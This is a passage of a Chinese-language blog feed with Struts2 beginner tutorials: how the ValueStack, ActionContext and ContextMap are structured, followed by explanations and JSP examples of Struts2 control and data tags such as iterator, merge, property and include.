href="#0x06-ValueStack、StackContext、ActionContext" class="headerlink" title="0x06 ValueStack、StackContext、ActionContext"></a>0x06 ValueStack、StackContext、ActionContext</h2><p><strong>具体作用的描述:</strong></p><ul><li>valueStack: 里面存放的是Action类中通过set方法设置的属性值(表单传过来的值等),由OGNL框架实现</li><li>stackContext: 也是用来存值的,stack上下文，它包含一些列对象，包括request/session/attr/application map等</li><li>actionContext: 是action的上下文,可以得到request,session,application等,我们在JSP页面中访问value stack的内容时，是不用加#，而如果是访问stack context的其他对象则要加上#</li></ul><p><strong>具体区别:</strong></p><ul><li>ActionContext 就是应用上下文，可以通过他来访问session对象等，可以保存的数据，以map形式存储,在这个应用中都可以访问该数据。通常用于还回一个session对象。</li><li>ValueStack 是OGNL表达式语言中的值栈， 用来封装继承了action接口的类的属性值，以栈结构存储,在同一个请求范围类有效，在页面中直接通过表达式${属性名}就可以取出</li><li>值栈也称为栈结构，ActionContext也称为映射结构,表示值栈的context</li><li>ValueStack和ActionContext本质上可以互相获得。ValueStack.getContext()方法得到的Map其实就是ActionContext的Map</li></ul><h3 id="ValueStack的内容"><a href="#ValueStack的内容" class="headerlink" title="ValueStack的内容"></a>ValueStack的内容</h3><p>经过调试发现：</p><p><img src="/2020/05/01/Struts2基础篇之ValueStack（值栈）/2.png" alt=""></p><p>值得注意的以下几点：</p><ul><li>context实际上就是ActionContext的context内容；</li><li>securityMemberAccess是后续的Struts2一直发展的安全措施；</li></ul><h3 id="ActionContext的内容"><a href="#ActionContext的内容" class="headerlink" title="ActionContext的内容"></a>ActionContext的内容</h3><p>ActionContext主要维护一个context对象，我们下面称为ContextMap。</p><p>一般情况下，root 对象在存储 Action 的相关信息时会把相关的映射压入ContextMap中，这些相关的映射具体如下：</p><table><thead><tr><th style="text-align:left">key</th><th style="text-align:left">key的声明处</th><th style="text-align:left">value的类型</th><th style="text-align:left">value.toString()</th></tr></thead><tbody><tr><td style="text-align:left">com.opensymphony.xwork2.dispatcher.HttpServletRequest</td><td style="text-align:left">StrutsStatics.HTTP_REQUEST</td><td style="text-align:left">org.apache.struts2.dispatcher.StrutsRequestWrapper</td><td style="text-align:left">org.apache.struts2.dispatcher.StrutsRequestWrapper@10984e0</td></tr><tr><td style="text-align:left">application</td><td style="text-align:left">无</td><td style="text-align:left">org.apache.struts2.dispatcher.ApplicationMap</td><td style="text-align:left">略</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext.locale</td><td style="text-align:left">ActionContext.LOCALE</td><td style="text-align:left">java.util.Locale</td><td style="text-align:left">zh_CN</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.dispatcher.HttpServletResponse</td><td style="text-align:left">StrutsStatics.HTTP_RESPONSE</td><td style="text-align:left">org.apache.catalina.connector.ResponseFacade</td><td style="text-align:left">org.apache.catalina.connector.ResponseFacade@14ecfe8</td></tr><tr><td style="text-align:left">xwork.NullHandler.createNullObjects</td><td style="text-align:left"></td><td style="text-align:left">Boolean</td><td style="text-align:left">false</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext.name</td><td style="text-align:left">ActionContext.ACTION_NAME</td><td style="text-align:left">String</td><td style="text-align:left">index</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext.conversionErrors</td><td style="text-align:left">ActionContext.CONVERSION_ERRORS</td><td style="text-align:left">java.util.HashMap</td><td style="text-align:left">{}</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext.application</td><td style="text-align:left">ActionContext.APPLICATION</td><td style="text-align:left">org.apache.struts2.dispatcher.ApplicationMap</td><td style="text-align:left">略</td></tr><tr><td style="text-align:left">attr</td><td style="text-align:left">无</td><td style="text-align:left">org.apache.struts2.util.AttributeMap</td><td style="text-align:left">org.apache.struts2.util.AttributeMap@133a2a8</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext.container</td><td style="text-align:left">ActionContext.CONTAINER</td><td style="text-align:left">com.opensymphony.xwork2.inject.ContainerImpl</td><td style="text-align:left">com.opensymphony.xwork2.inject.ContainerImpl@fc02c8</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.dispatcher.ServletContext</td><td style="text-align:left">StrutsStatics.SERVLET_CONTEXT</td><td style="text-align:left">org.apache.catalina.core.ApplicationContextFacade</td><td style="text-align:left">org.apache.catalina.core.ApplicationContextFacade@11ad78c</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext.session</td><td style="text-align:left">ActionContext.SESSION</td><td style="text-align:left">org.apache.struts2.dispatcher.SessionMap</td><td style="text-align:left">{}</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext. actionInvocation</td><td style="text-align:left">ActionContext.ACTION_INVOCATION</td><td style="text-align:left">com.opensymphony.xwork2.DefaultActionInvocation</td><td style="text-align:left">com.opensymphony.xwork2.DefaultActionInvocation@13d4497</td></tr><tr><td style="text-align:left">xwork.MethodAccessor.denyMethodExecution</td><td style="text-align:left">笔者很懒，没有找</td><td style="text-align:left">Boolean</td><td style="text-align:left">false</td></tr><tr><td style="text-align:left">report.conversion.errors</td><td style="text-align:left">笔者很懒，没有找</td><td style="text-align:left">Boolean</td><td style="text-align:left">false</td></tr><tr><td style="text-align:left">session</td><td style="text-align:left">无</td><td style="text-align:left">org.apache.struts2.dispatcher.SessionMap</td><td style="text-align:left">{}</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.util.ValueStack.ValueStack</td><td style="text-align:left">ValueStack.VALUE_STACK</td><td style="text-align:left">com.opensymphony.xwork2.ognl.OgnlValueStack</td><td style="text-align:left">com.opensymphony.xwork2.ognl.OgnlValueStack@16237fd</td></tr><tr><td style="text-align:left">request</td><td style="text-align:left">无</td><td style="text-align:left">org.apache.struts2.dispatcher.RequestMap</td><td style="text-align:left">略</td></tr><tr><td style="text-align:left">action</td><td style="text-align:left">笔者很懒，没有找</td><td style="text-align:left">com.example.MyAction</td><td style="text-align:left">略</td></tr><tr><td style="text-align:left">struts.actionMapping</td><td style="text-align:left">笔者很懒，没有找</td><td style="text-align:left">org.apache.struts2.dispatcher.mapper.ActionMapping</td><td style="text-align:left">org.apache.struts2.dispatcher.mapper.ActionMapping@892cc5</td></tr><tr><td style="text-align:left">parameters</td><td style="text-align:left">无</td><td style="text-align:left">java.util.HashMap</td><td style="text-align:left">{}</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext.parameters</td><td style="text-align:left">ActionContext.PARAMETERS</td><td style="text-align:left">java.util.TreeMap</td></tr></tbody></table><h2 id="0x06-值栈内部结构详解"><a href="#0x06-值栈内部结构详解" class="headerlink" title="0x06 值栈内部结构详解"></a>0x06 值栈内部结构详解</h2><p>ValueStack 对象的内部有两个逻辑部分。</p><ul><li>ObjectStack（对象栈）：是 CompoundRoot 类型，用 ArrayList 定义，Struts2 把动作和相关对象压入 ObjectStack 中。</li><li>ContextMap（Map 栈）：是 OgnlContext 类型，是一个 Map 集合，Struts2 把各种各样的映射关系（一些 Map 类型的对象）压入 ContextMap 中。</li></ul><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>新建一个名称为 ValueStackAction 的类，并在类中编写一个获取 ValueStack 对象的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea.ognl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionContext;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.util.ValueStack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ValueStackAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 通过ActionContext获取valueStack对象</span></span><br><span class="line">        ValueStack valueStack = ActionContext.getContext().getValueStack();</span><br><span class="line">        System.out.println(valueStack);</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将新建的 Action 信息添加到 struts.xml 中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"valueStack"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.ognl.ValueStackAction"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后，开启远程调试，在 ValueStackAction 类中的第 11 行处设置断点，访问<code>http://localhost:8080/st2test/valueStack.action</code>，从 Variables 窗口中可以看到 valueStack 的结构信息：</p><p><img src="/2020/05/01/Struts2基础篇之ValueStack（值栈）/3.png" alt=""></p><p>这里只需关注 context 对象和 root 对象。从图中可以看到，context 对象的类型为 OgnlContext，root 对象的类型为 CompoundRoot。如果要查看这两个类的源码，则可以看到如下语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OgnlContext extends Object implements Map</span><br><span class="line">CompoundRoot extends ArrayList</span><br></pre></td></tr></table></figure><p>从上述两个类的源码中可以看出，context 对象实际上就是一个 Map，root 对象实际上就是一个 ArrayList。也就说明了 ValueStack 的两个逻辑部分 ObjectStack 对应 ArrayList（root），ContextMap 对应 Map（context）。</p><p>一般情况下，root 对象在存储 Action 的相关信息时会把相关的映射压入 ContextMap 中，这些相关的映射具体如下。</p><ul><li>parameters：该 Map 中包含当前请求的请求参数。</li><li>request：该 Map 中包含当前 request 对象中的所有属性。</li><li>session：该 Map 中包含当前 session 对象中的所有属性。</li><li>application：该 Map 中包含当前 application 对象中的所有属性。</li><li>attr：该 Map 按如下顺序检索某个属性：request，session，application。</li></ul><h2 id="0x07-获取值栈数据的方式"><a href="#0x07-获取值栈数据的方式" class="headerlink" title="0x07 获取值栈数据的方式"></a>0x07 获取值栈数据的方式</h2><p>在 Struts2 中，值栈的主要作用就是解决从 Action 到页面的数据交换问题。在采用属性驱动和模型驱动交换数据时，Struts2 会将对象自动存储到 ValueStack 中，其存储说明如下：</p><ul><li>属性驱动：每次请求访问 Action 的对象时，Action 中的属性对象会被自动压入 ValueStack 中。</li><li>模型驱动：Action 如果实现了 ModelDriven 接口，那么 ModelDrivenInterceptor 拦截器会生效，会将 model 对象压入到 ValueStack 中。</li></ul><p>属性对象或 model 对象存储到 ValueStack 中后，就可以直接从 ValueStack 中获取页面所需的数据。</p><p>Demo参考：<a href="http://c.biancheng.net/view/4145.html" target="_blank" rel="noopener">http://c.biancheng.net/view/4145.html</a></p><h2 id="0x08-通过EL访问值栈的数据"><a href="#0x08-通过EL访问值栈的数据" class="headerlink" title="0x08 通过EL访问值栈的数据"></a>0x08 通过EL访问值栈的数据</h2><p>具体参考：<a href="http://c.biancheng.net/view/4146.html" target="_blank" rel="noopener">http://c.biancheng.net/view/4146.html</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/categories/Java/Struts2/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>Struts2基础篇之标签</title>
    <link href="https://www.mi1k7ea.com/2020/05/01/Struts2%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B9%8B%E6%A0%87%E7%AD%BE/"/>
    <id>https://www.mi1k7ea.com/2020/05/01/Struts2基础篇之标签/</id>
    <published>2020-04-30T16:00:04.000Z</published>
    <updated>2020-08-15T06:40:45.566Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>本笔记直接参考或引自如下链接文章：</p><p><a href="http://c.biancheng.net/struts2/" target="_blank" rel="noopener">http://c.biancheng.net/struts2/</a></p><p><a href="https://www.w3cschool.cn/struts_2/" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/</a></p><h2 id="0x01-标签的分类和使用"><a href="#0x01-标签的分类和使用" class="headerlink" title="0x01 标签的分类和使用"></a>0x01 标签的分类和使用</h2><p>Struts2 是一个优秀的 MVC 框架，其实现重点主要放在了业务逻辑控制器部分和视图页面部分。控制器部分主要由 Action 提供支持，而视图页面部分则由大量的标签提供支持。</p><p>Struts2 的标签库是一个比较完善且功能强大的标签库，它将所有标签都统一到一个标签库中，从而简化了标签的使用；它提供了对主题和模板的支持，极大地简化了视图页面代码的编写；它还提供了对 Ajax 的支持，极大地丰富了视图页面的展示效果。</p><p>与 JSTL（JSP Standard Tag Library，JSP标准标签库）相比，Struts2 标签库更加易用和强大。</p><h3 id="标签库的分类"><a href="#标签库的分类" class="headerlink" title="标签库的分类"></a>标签库的分类</h3><p>Struts2 框架对整个标签库进行了分类，按其功能大致可分为两类，如图所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/1.png" alt=""></p><p>可以看出，Struts2 的标签库主要分为两大类：普通标签和 UI 标签。普通标签的主要功能是在页面生成时控制页面代码的执行流程；UI 标签的主要功能是以丰富且可复用的 HTML 文件显示数据。</p><p>普通标签又分为控制标签（Control Tags）和数据标签（Data Tags）。控制标签用于完成条件逻辑和循环逻辑的控制，也可用于做集合的操作。数据标签用于输出后台的数据和完成其他数据访问功能。</p><p>UI 标签又分为表单标签（Form Tags）、非表单标签（Non-Form Tags）和 Ajax 标签。表单标签主要用于生成 HTML 页面中的表单元素，非表单标签主要用于生成非表单的可视化元素，如输出 Action 中封装的信息等。Ajax 标签主要用于提供对 Ajax 技术的支持。</p><h3 id="标签的使用"><a href="#标签的使用" class="headerlink" title="标签的使用"></a>标签的使用</h3><p>使用 Struts2 的标签库非常简单，一般只需在 JSP 文件内使用 taglib 指令导入 Struts2 标签库即可，其导入代码如下所示：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br></pre></td></tr></table></figure><p>在上述代码中，taglib 指令的 uri 属性用于指定引入标签库描述符文件的位置，prefix 属性用于指定引入标签库描述符文件的前缀。在 JSP 文件中，所有的 Struts2 标签都建议使用 s 作为前缀。</p><h2 id="0x02-控制标签"><a href="#0x02-控制标签" class="headerlink" title="0x02 控制标签"></a>0x02 控制标签</h2><p>针对页面中经常需要实现的流程控制和循环等操作，Struts2标签库中提供了控制标签。</p><h3 id="if和else标签"><a href="#if和else标签" class="headerlink" title="if和else标签"></a>if和else标签</h3><p>Struts2 标签库中的 <code>&lt;s:if&gt;、&lt;s:elseif&gt;、&lt;s:else&gt;</code> 标签与 Java 中的 if、else if 和 else 语句功能类似，主要用于程序的分支逻辑控制。其中，只有 <code>&lt;s:if&gt;</code> 标签可以单独使用，而 <code>&lt;s:elseif&gt;、&lt;s:else&gt;</code> 都必须与 <code>&lt;s:if&gt;</code> 标签结合才能使用。其使用语法格式如下所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:<span class="keyword">if</span> test=<span class="string">"表达式1"</span>&gt;</span><br><span class="line">    标签体</span><br><span class="line">&lt;/s:if&gt;</span><br><span class="line">&lt;s:elseif test=<span class="string">"表达式2"</span>&gt;</span><br><span class="line">    标签体</span><br><span class="line">&lt;/s:elseif&gt;</span><br><span class="line">&lt;s:<span class="keyword">else</span>&gt;</span><br><span class="line">    标签体</span><br><span class="line">&lt;/s:else&gt;</span><br></pre></td></tr></table></figure><p>在上述语法格式中，<code>&lt;s:if&gt; 和 &lt;s:elseif&gt;</code> 标签必须指定 test 属性，该属性用于设置标签的判断条件，其值是一个 boolean 类型的条件表达式。</p><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_if_else_tags.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_if_else_tags.html</a></p><h3 id="iterator标签"><a href="#iterator标签" class="headerlink" title="iterator标签"></a>iterator标签</h3><p><code>&lt;s:iterator&gt;</code> 标签主要用于对集合中的数据进行迭代，它可以根据条件遍历集合中的数据。&lt;s:iterator&gt; 标签的属性及相关说明如表所示。</p><table><thead><tr><th>属性</th><th>是否必须</th><th>默认值</th><th>类型</th><th>描  述</th></tr></thead><tbody><tr><td>begin</td><td>否</td><td>0</td><td>Integer</td><td>迭代数组或集合的起始位置</td></tr><tr><td>end</td><td>否</td><td>数组或集合的长度大小减 1，若 Step 为负，则为 0。</td><td>Integer</td><td>迭代数组或集合的结束位置</td></tr><tr><td>status</td><td>否</td><td>false</td><td>Boolean</td><td>迭代过程中的状态</td></tr><tr><td>step</td><td>否</td><td>1</td><td>Integer</td><td>指定每一次迭代后索引增加的值</td></tr><tr><td>value</td><td>否</td><td>无</td><td>String</td><td>迭代的数组或集合对象</td></tr><tr><td>var</td><td>否</td><td>无</td><td>String</td><td>将生成的 Iterator 设置为 page 范围的属性</td></tr><tr><td>id</td><td>否</td><td>无</td><td>String</td><td>指定了集合元素的 id，现已用 var 代替</td></tr></tbody></table><p>如果在 <code>&lt;s:iterator&gt;</code> 标签中指定 status 属性，就可以通过该属性获取迭代过程中的状态信息，如元素数、当前索引值等。通过 status 属性获取信息的方法如下表所示（假设其属性值为 st）。</p><table><thead><tr><th>方 法</th><th>说 明</th></tr></thead><tbody><tr><td>st.count</td><td>返回当前已经遍历的集合元素的个数</td></tr><tr><td>st.first</td><td>返回当前遍历元素是否为集合的第一个元素</td></tr><tr><td>st.last</td><td>返回当前遍历元素是否为集合的最后一个元素</td></tr><tr><td>st.index</td><td>返回遍历元素的当前索引值</td></tr></tbody></table><p>这些iterator将迭代一个值。可迭代值可以是以下任一值：java.util.Collection，java.util.Iterator。在迭代一个iterator时，可以使用<strong>Sort</strong>标签对结果进行排序，或者使用<strong>SubSet</strong>标签来获取列表或数组的子集。</p><p>以下示例是检索值栈上当前对象的getDays()方法的值，并使用它迭代。<code>&lt;s:property/&gt;</code>标签印出迭代器的当前值。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:iterator value=<span class="string">"days"</span>&gt;</span><br><span class="line">  &lt;p&gt;day is: &lt;s:property/&gt;&lt;/p&gt;</span><br><span class="line">&lt;/s:iterator&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_iterator_tags.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_iterator_tags.html</a></p><h3 id="merge标签"><a href="#merge标签" class="headerlink" title="merge标签"></a>merge标签</h3><p>这些<strong>merge</strong>标签采用两个或多个列表作为参数，并将它们合并在一起，如下所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:merge <span class="keyword">var</span>=<span class="string">"myMergedIterator"</span>&gt;</span><br><span class="line">     &lt;s:param value=<span class="string">"%&#123;myList1&#125;"</span> /&gt;</span><br><span class="line">     &lt;s:param value=<span class="string">"%&#123;myList2&#125;"</span> /&gt;</span><br><span class="line">     &lt;s:param value=<span class="string">"%&#123;myList3&#125;"</span> /&gt;</span><br><span class="line">&lt;/s:merge&gt;</span><br><span class="line">&lt;s:iterator value=<span class="string">"%&#123;#myMergedIterator&#125;"</span>&gt;</span><br><span class="line">     &lt;s:property /&gt;</span><br><span class="line">&lt;/s:iterator&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_merge_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_merge_tag.html</a></p><h3 id="append标签"><a href="#append标签" class="headerlink" title="append标签"></a>append标签</h3><p>这些<strong>append</strong>标签采用两个或多个列表作为参数，并将它们全部附加在一起，如下所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:append <span class="keyword">var</span>=<span class="string">"myAppendIterator"</span>&gt;</span><br><span class="line">     &lt;s:param value=<span class="string">"%&#123;myList1&#125;"</span> /&gt;</span><br><span class="line">     &lt;s:param value=<span class="string">"%&#123;myList2&#125;"</span> /&gt;</span><br><span class="line">     &lt;s:param value=<span class="string">"%&#123;myList3&#125;"</span> /&gt;</span><br><span class="line">&lt;/s:append&gt;</span><br><span class="line">&lt;s:iterator value=<span class="string">"%&#123;#myAppendIterator&#125;"</span>&gt;</span><br><span class="line">     &lt;s:property /&gt;</span><br><span class="line">&lt;/s:iterator&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_append_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_append_tag.html</a></p><h3 id="generator标签"><a href="#generator标签" class="headerlink" title="generator标签"></a>generator标签</h3><p>这些<strong>generator</strong>标签基于提供的val属性生成迭代器。下面的generator标签生成一个迭代器并使用iterator标签打印出来。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:generator val=<span class="string">"%&#123;'aaa,bbb,ccc,ddd,eee'&#125;"</span>&gt;</span><br><span class="line"> &lt;s:iterator&gt;</span><br><span class="line">     &lt;s:property /&gt;&lt;br/&gt;</span><br><span class="line"> &lt;/s:iterator&gt;</span><br><span class="line">&lt;/s:generator&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_generator_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_generator_tag.html</a></p><h2 id="0x03-数据标签"><a href="#0x03-数据标签" class="headerlink" title="0x03 数据标签"></a>0x03 数据标签</h2><p>数据标签主要用于提供各种和数据访问相关的功能，如输出信息和显示调试信息等。</p><h3 id="property标签"><a href="#property标签" class="headerlink" title="property标签"></a>property标签</h3><p><code>&lt;s:property&gt;</code> 标签的作用是输出指定的值，通常输出的是 value 属性指定的值，<code>&lt;s:property&gt;</code> 标签的属性及属性说明如下。</p><ul><li>value：可选属性，指定需要输出的属性值，如果没有指定该属性，则默认输出 ValueStack 栈顶的值（关于值栈内容会在后面教程中进行讲解）。</li><li>id：可选属性，指定该元素的标识。</li><li>default：可选属性，如果要输出的属性值为 null，则显示 default属性的指定值。</li><li>escape：可选属性，指定是否忽略 HTML 代码。默认值是 true，即忽略输出值中的 HTML 代码。</li></ul><p>示例：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:push value=<span class="string">"myBean"</span>&gt;</span><br><span class="line">    &lt;!-- Example <span class="number">1</span>: --&gt;</span><br><span class="line">    &lt;s:property value=<span class="string">"myBeanProperty"</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Example <span class="number">2</span>: --&gt;TextUtils</span><br><span class="line">    &lt;s:property value=<span class="string">"myBeanProperty"</span> <span class="keyword">default</span>=<span class="string">"a default value"</span> /&gt;</span><br><span class="line">&lt;/s:push&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_property_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_property_tag.html</a></p><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p>propertyTags.jsp，分别对 <code>&lt;s:property&gt;</code> 标签的 value、default 和 escape 属性的使用进行了演示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;property标签&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">输出字符串：</span><br><span class="line">&lt;s:property value=<span class="string">"'this is a string'"</span>/&gt;&lt;br/&gt;</span><br><span class="line">输出默认值：</span><br><span class="line">&lt;s:property value=<span class="string">""</span> <span class="keyword">default</span>=<span class="string">"default_value"</span>/&gt;&lt;br/&gt;</span><br><span class="line">忽略HTML代码：</span><br><span class="line">&lt;s:property value=<span class="string">"'&lt;h2&gt;www.mi1k7ea.com&lt;/h2&gt;'"</span> escape=<span class="string">"true"</span>/&gt;&lt;br/&gt;</span><br><span class="line">不忽略HTML代码：</span><br><span class="line">&lt;s:property value=<span class="string">"'&lt;h2&gt;www.mi1k7ea.com&lt;/h2&gt;'"</span> escape=<span class="string">"false"</span>/&gt;&lt;br/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="/2020/05/01/Struts2基础篇之标签/2.png" alt=""></p><h3 id="action标签"><a href="#action标签" class="headerlink" title="action标签"></a>action标签</h3><p>此标签允许开发人员通过指定action名称和可选的命名空间直接从JSP页面调用action。标签的正文内容用于呈现action的结果。在struts.xml中为此action定义的任何结果处理程序将会被忽略，除非指定executeResult参数。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;Tag to execute the action&lt;/div&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;s:action name=<span class="string">"actionTagAction"</span> executeResult=<span class="string">"true"</span> /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;div&gt;To invokes special method  in action <span class="class"><span class="keyword">class</span>&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span> /&gt;</span></span><br><span class="line">&lt;s:action name="actionTagAction!specialMethod" executeResult="true" /&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_action_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_action_tag.html</a></p><h3 id="include标签"><a href="#include标签" class="headerlink" title="include标签"></a>include标签</h3><p>include标签标签用于在当前页面中包含另一个 Web 资源（如 HTML、JSP、Servlet 等）。该标签有两个属性 id 和 value。其中 id 是可选属性，表示该标签的引用；value 是必填属性，用于指定被包含的 Web 资源文件。</p><p>在 <code>&lt;s:include&gt;</code> 标签中还可以指定多个 <code>&lt;s:param/&gt;</code> 子标签给被包含的 Web 资源传递请求参数。</p><h4 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h4><p>file.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 